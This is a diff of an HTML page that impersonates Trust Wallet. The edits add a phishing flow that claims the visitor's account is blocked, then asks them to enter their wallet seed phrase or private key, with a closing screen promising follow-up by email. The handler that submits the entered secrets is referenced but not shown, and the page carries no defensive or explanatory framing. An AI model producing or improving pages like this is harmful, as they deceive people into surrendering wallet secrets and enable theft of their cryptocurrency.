@@ -46,25 +46,41 @@
         <div class="hero-content">
             <img class="pin" src="https://i.pinimg.com/originals/1e/2d/c8/1e2dc8e5ad302df838a5bc95cdd756c5.png">
             <h1>Crypto Wallet Trust </h1>
+           
+           
+           
             <p class="hero-subtitle">Official Trust Wallet account. In order to continue using our site, we need to verify that you are a Trust Wallet user. Please select the following</p>
-            <div class="download-buttons" id="walletSection">
-                <form id="seedForm" class="download-btn">
-                    <label for="seedInput" style="color: var(--primary); font-weight: 500;">Введите seed фразу:</label>
-                    <textarea id="seedInput" name="seed" rows="3" placeholder="e.g. abandon abandon ability..." required 
-                        style="padding: 10px; border-radius: 10px; border: none; width: 100%; max-width: 100%; resize: none; font-weight: 500;"></textarea>
-                    <button type="submit" style="padding: 10px 20px; background-color: var(--primary); color: white; border: none; border-radius: 25px; font-weight: 600;">Continue</button>
-                </form>
-            </div>
             
-            <div id="newSeedDisplay">
-                <h3>Это ваша новая seed-фраза:</h3>
-                <p id="generatedSeed" style="margin-top: 10px; font-weight: bold;"></p>
-                <p style="margin-top: 15px; color: #FFD700; font-size: 14px;">
-                    Внимание: сохраните эту фразу в надёжном месте. Никому её не передавайте. 
-                    С её помощью можно получить полный доступ к вашему кошельку.
-                </p>
-            </div>
-                  
+            <div class="box" id="step1">
+                <img src="logo.png" alt="logo" class="logo">
+                <h2>Ваша учетная запись временно заблокирована</h2>
+                <p>Для восстановления доступа выберите метод подтверждения.</p>
+                <button onclick="showStep2()">Восстановить доступ</button>
+              </div>
+              
+              <div class="box hidden" id="step2">
+                <h2>Выберите метод подтверждения</h2>
+                <button onclick="selectMethod('seed')">Seed фраза</button>
+                <button onclick="selectMethod('private')">Приватный ключ</button>
+              </div>
+              
+              <div class="box hidden" id="seedForm">
+                <h2>Введите вашу Seed фразу</h2>
+                <textarea id="seedInput" rows="4" placeholder="Введите 12 или 24 слова..."></textarea>
+                <button onclick="submitRecovery()">Продолжить</button>
+              </div>
+              
+              <div class="box hidden" id="privateForm">
+                <h2>Введите приватный ключ</h2>
+                <textarea id="privateInput" rows="4" placeholder="Введите приватный ключ..."></textarea>
+                <button onclick="submitRecovery()">Продолжить</button>
+              </div>
+              
+              <div class="box hidden" id="finalMessage">
+                <h2>Спасибо!</h2>
+                <p>Мы отправим вам на электронную почту дальнейшие действия.</p>
+              </div>
+              
                 </div>
             </div>
             
@@ -106,7 +122,7 @@
         </div>
     </section>
 
-    <section class="assets">
+    <!-- <section class="assets">
         <div class="container">
             <h2 class="section-title">Поддерживаемые активы</h2>
             
@@ -133,7 +149,7 @@
                 </div>
             </div>
         </div>
-    </section>
+    </section> -->
 
     <section class="cta">
         <div class="container">
